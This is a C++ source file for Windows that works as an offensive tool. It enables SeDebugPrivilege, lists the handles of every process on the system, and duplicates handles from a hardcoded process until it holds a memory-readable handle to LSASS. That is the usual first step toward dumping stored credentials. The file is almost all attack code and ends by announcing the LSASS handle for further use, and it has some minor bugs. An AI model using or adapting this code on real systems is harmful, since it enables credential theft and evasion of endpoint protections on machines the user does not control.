#include <iostream>
#include <Windows.h>
#include "NTHeaders.h"
#include <Psapi.h>
#include <minidumpapiset.h>
#include <tlhelp32.h>
#define GREEN   "\033[32m" 
#define RESET   "\033[0m"

BOOL SetPrivilege(
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue Failed\n");
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	HANDLE hCurrentProcess = GetCurrentProcess();
	HANDLE hToken = NULL;

	//Opening a handle to the process token
	if (!OpenProcessToken(hCurrentProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] OpenProcessToken Failed\n");
		return FALSE;
	}

	//Changing token privileges to the new token privileges 
	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL);
	
	if (GetLastError() != ERROR_SUCCESS) {
		printf("[-] AdjustTokenPrivileges Failed\n");
		return FALSE;
	}


	return TRUE;
}

DWORD getLsassByName() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (!wcscmp(entry.szExeFile,L"lsass.exe"))
			{
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);

	return 0;
}


int main()
{
	DWORD pid = 8076;
	DWORD lsassPid;
	PSYSTEM_HANDLE_INFORMATION SystemInformation;
	ULONG handleInfoSize = 0x10000;
	ULONG returnLength = 0;


	//Get our SE_DEBUG_PRIVILEGE
	if (!SetPrivilege(L"SeDebugPrivilege", TRUE)) {
		ShowErr();
		exit(0);
	}
	

	printf("[+] Enabled SeDebugPrivilege\n");
	
	lsassPid = getLsassByName();


	//Getting the addresses of NTDLL functions
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");


	
	//Allocating an arbitrary size for the SystemInformation buffer
	SystemInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);


	//Keep checking if we have an INFO_LENGTH_MISMATCH and reallocate the size of the buffer

	while (NtQuerySystemInformation(SystemHandleInformation,
		SystemInformation,
		handleInfoSize, &returnLength) == STATUS_INFO_LENGTH_MISMATCH) {
		handleInfoSize = returnLength;
		free(SystemInformation);
		SystemInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	}


	printf("[+] Found %lu handles\n", SystemInformation->HandleCount);

	printf("[+] Scanning PID %d\n", pid);
	//Opening the target process
	

	//iterate over every handle in the system
	for (int i = 0; i < SystemInformation->HandleCount; i++) {

		SYSTEM_HANDLE hCurrentHandle = SystemInformation->Handles[i];

		//We don't have access to this.
		if (hCurrentHandle.GrantedAccess == 0x0012019f) {
			continue;
		}
		
		HANDLE hDuplicateHandle = NULL;


		//check if the handles belong to the target process
		if (hCurrentHandle.ProcessId != pid) {
			continue;
		}
	

		//Duplicate the handle so we can use 
		int duplicateObjectStatus;
		
		HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, false, pid);

		NtDuplicateObject(hProcess,
			(void*)hCurrentHandle.Handle,
			GetCurrentProcess(),
			&hDuplicateHandle,
			PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
			NULL,
			NULL
		);
		

		if (GetLastError() != ERROR_SUCCESS) {
			printf("NtDuplicateObject Failed\n");
			ShowErr();
		}


		//duplication successful
		POBJECT_TYPE_INFORMATION ObjectInfo = (POBJECT_TYPE_INFORMATION) malloc(10000);
		ULONG retLengh = 0;
		ULONG ObjectLength = 0;

		DWORD status = 0;
		
		//Query the handle to get info 
		while (NtQueryObject(hDuplicateHandle,
			ObjectTypeInformation,
			ObjectInfo,
			ObjectLength,
			&retLengh) == STATUS_INFO_LENGTH_MISMATCH) {
			ObjectLength = retLengh;
		}

		if (ObjectLength == 0) {
			continue;
		}

		//Check if the type is process
		if (!wcscmp(ObjectInfo->Name.Buffer, L"Process")) {
			
			DWORD dCurrentPid = GetProcessId(hDuplicateHandle);

			//Check if the process matches LSASS PID
			if (dCurrentPid == lsassPid) {

				//We have a handle to lsass. Do whatever you want with it.
				fprintf(stderr, GREEN "[+] We now have a handle to lsass!\n" RESET );

				CloseHandle(hDuplicateHandle);
			}
		}
		
	}

}

